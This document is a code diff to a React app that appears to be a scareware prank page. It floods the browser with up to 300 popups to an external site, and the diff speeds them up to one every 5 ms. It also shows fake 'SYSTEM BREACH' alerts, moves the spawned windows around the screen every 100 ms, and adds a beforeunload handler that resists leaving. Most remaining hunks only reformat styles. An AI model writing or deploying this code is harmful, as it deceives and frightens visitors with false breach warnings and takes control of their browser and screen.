@@ -7,6 +7,8 @@ function App() {
   const [fakePopups, setFakePopups] = useState([]);
 
   const intervals = useRef([]);
+  // Ref to hold references to the external browser windows
+  const externalWindows = useRef([]);
 
   // ----------------------------
   // OPEN MULTIPLE BROWSER WINDOWS
@@ -17,19 +19,25 @@ function App() {
       "https://hackedscreen.com/"
     ];
 
-    for (let i = 0; i < 300; i++) {
-      setTimeout(() => {
-        window.open(
-          urls[i % urls.length],
-          "_blank",
-          `
-          width=${300 + Math.random() * 400},
-          height=${200 + Math.random() * 300},
-          left=${Math.random() * window.screen.width},
+      for (let i = 0; i < 300; i++) {
+        setTimeout(() => {
+          // Capture the window reference
+          const newWindow = window.open(
+            urls[i % urls.length],
+            "_blank",
+            `
+            width=${300 + Math.random() * 400},
+            height=${200 + Math.random() * 300},
+            left=${Math.random() * window.screen.width},
           top=${Math.random() * window.screen.height}
           `
         );
-      }, i * 250);
+
+        // If the browser didn't block the popup, save its reference
+        if (newWindow) {
+          externalWindows.current.push(newWindow);
+        }
+      }, i * 5  );
     }
   };
 
@@ -83,15 +91,10 @@ function App() {
         ...prev,
         {
           id: Math.random(),
-
-          // position
           x: Math.random() * (window.innerWidth - 300),
           y: Math.random() * (window.innerHeight - 150),
-
-          // movement
           dx: (Math.random() - 0.5) * 12,
           dy: (Math.random() - 0.5) * 12,
-
           width: 150 + Math.random() * 200,
           height: 80 + Math.random() * 120,
           text: getRandomScaryText()
@@ -101,17 +104,15 @@ function App() {
 
     intervals.current.push(popupInterval);
 
-    // Move popups around
+    // Move internal popups around
     const moveInterval = setInterval(() => {
       setFakePopups(prev =>
         prev.map(p => {
           let newX = p.x + p.dx;
           let newY = p.y + p.dy;
-
           let newDx = p.dx;
           let newDy = p.dy;
 
-          // Bounce off walls
           if (newX <= 0 || newX + p.width >= window.innerWidth) {
             newDx *= -1;
           }
@@ -122,14 +123,8 @@ function App() {
 
           return {
             ...p,
-            x: Math.max(
-              0,
-              Math.min(window.innerWidth - p.width, newX)
-            ),
-            y: Math.max(
-              0,
-              Math.min(window.innerHeight - p.height, newY)
-            ),
+            x: Math.max(0, Math.min(window.innerWidth - p.width, newX)),
+            y: Math.max(0, Math.min(window.innerHeight - p.height, newY)),
             dx: newDx,
             dy: newDy
           };
@@ -138,6 +133,20 @@ function App() {
     }, 16);
 
     intervals.current.push(moveInterval);
+
+    // NEW: Interval to randomly move external tabs/windows
+    const externalMoveInterval = setInterval(() => {
+      externalWindows.current.forEach((win) => {
+        // Check if the window is still open and not closed by user
+        if (win && !win.closed) {
+          const randomX = Math.random() * (window.screen.width - 400);
+          const randomY = Math.random() * (window.screen.height - 400);
+          win.moveTo(randomX, randomY);
+        }
+      });
+    }, 100); // Shifting position every 100ms
+
+    intervals.current.push(externalMoveInterval);
 
     // Limit popup count
     const cleanupInterval = setInterval(() => {
@@ -151,11 +160,25 @@ function App() {
   };
 
   // ----------------------------
-  // CLEANUP
+  // CLEANUP + LEAVE WARNING
   // ----------------------------
   useEffect(() => {
+    const handleBeforeUnload = (e) => {
+      e.preventDefault();
+      e.returnValue = "";
+    };
+
+    window.addEventListener("beforeunload", handleBeforeUnload);
+
     return () => {
       intervals.current.forEach(clearInterval);
+      
+      // Close all spawned windows when component unmounts
+      externalWindows.current.forEach((win) => {
+        if (win && !win.closed) win.close();
+      });
+
+      window.removeEventListener("beforeunload", handleBeforeUnload);
     };
   }, []);
 
@@ -168,8 +191,7 @@ function App() {
     return {
       ...styles.img,
       transform: `
-        translate(${Math.random() * 40 - 20}px,
-        ${Math.random() * 40 - 20}px)
+        translate(${Math.random() * 40 - 20}px, ${Math.random() * 40 - 20}px)
         rotate(${Math.random() * 20 - 10}deg)
         scale(${0.8 + Math.random() * 0.6})
       `,
@@ -230,15 +252,9 @@ function App() {
             zIndex: 9999
           }}
         >
-          <div
-            style={{
-              borderBottom: "1px solid #ff0000",
-              marginBottom: "4px"
-            }}
-          >
+          <div style={{ borderBottom: "1px solid #ff0000", marginBottom: "4px" }}>
             <span style={{ color: "red" }}>ALERT</span> - SYSTEM BREACH
           </div>
-
           <div>{p.text}</div>
         </div>
       ))}
@@ -247,65 +263,24 @@ function App() {
       <style>
         {`
           @keyframes glitch {
-            0% {
-              text-shadow: 2px 2px red, -2px -2px blue;
-            }
-
-            20% {
-              text-shadow: -2px 2px red, 2px -2px blue;
-            }
-
-            40% {
-              text-shadow: 4px -4px red, -4px 4px blue;
-            }
-
-            60% {
-              text-shadow: -4px -4px red, 4px 4px blue;
-            }
-
-            80% {
-              text-shadow: 2px -2px red, -2px 2px blue;
-            }
-
-            100% {
-              text-shadow: 2px 2px red, -2px -2px blue;
-            }
+            0% { text-shadow: 2px 2px red, -2px -2px blue; }
+            20% { text-shadow: -2px 2px red, 2px -2px blue; }
+            40% { text-shadow: 4px -4px red, -4px 4px blue; }
+            60% { text-shadow: -4px -4px red, 4px 4px blue; }
+            80% { text-shadow: 2px -2px red, -2px 2px blue; }
+            100% { text-shadow: 2px 2px red, -2px -2px blue; }
           }
-
           @keyframes flicker {
-            0% {
-              opacity: 1;
-            }
-
-            50% {
-              opacity: 0.4;
-            }
-
-            100% {
-              opacity: 1;
-            }
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
           }
-
           @keyframes shake {
-            0% {
-              transform: translate(0px, 0px);
-            }
-
-            25% {
-              transform: translate(3px, -3px);
-            }
-
-            50% {
-              transform: translate(-3px, 3px);
-            }
-
-            75% {
-              transform: translate(3px, 3px);
-            }
-
-            100% {
-              transform: translate(0px, 0px);
-            }
+            0% { transform: translate(0px, 0px); }
+            25% { transform: translate(3px, -3px); }
+            50% { transform: translate(-3px, 3px); }
+            75% { transform: translate(3px, 3px); }
+            100% { transform: translate(0px, 0px); }
           }
         `}
       </style>
@@ -323,13 +298,11 @@ const styles = {
     textAlign: "center",
     transition: "background-color 0.1s linear"
   },
-
   glitch: {
     fontSize: "60px",
     animation: "glitch 0.3s infinite",
     textShadow: "2px 2px red, -2px -2px blue"
   },
-
   button: {
     marginTop: "20px",
     padding: "15px 30px",
@@ -341,7 +314,6 @@ const styles = {
     animation: "flicker 0.2s infinite",
     boxShadow: "0 0 10px #00ff00"
   },
-
   button2: {
     display: "block",
     margin: "20px auto",
@@ -354,7 +326,6 @@ const styles = {
     boxShadow: "0 0 15px red",
     animation: "flicker 0.1s infinite"
   },
-
   textBox: {
     marginTop: "20px",
     fontSize: "14px",
@@ -362,7 +333,6 @@ const styles = {
     whiteSpace: "pre-wrap",
     animation: "flicker 0.2s infinite"
   },
-
   images: {
     display: "flex",
     flexWrap: "wrap",
@@ -370,7 +340,6 @@ const styles = {
     marginTop: "30px",
     justifyContent: "center"
   },
-
   img: {
     width: "250px",
     border: "3px solid #00ff00",
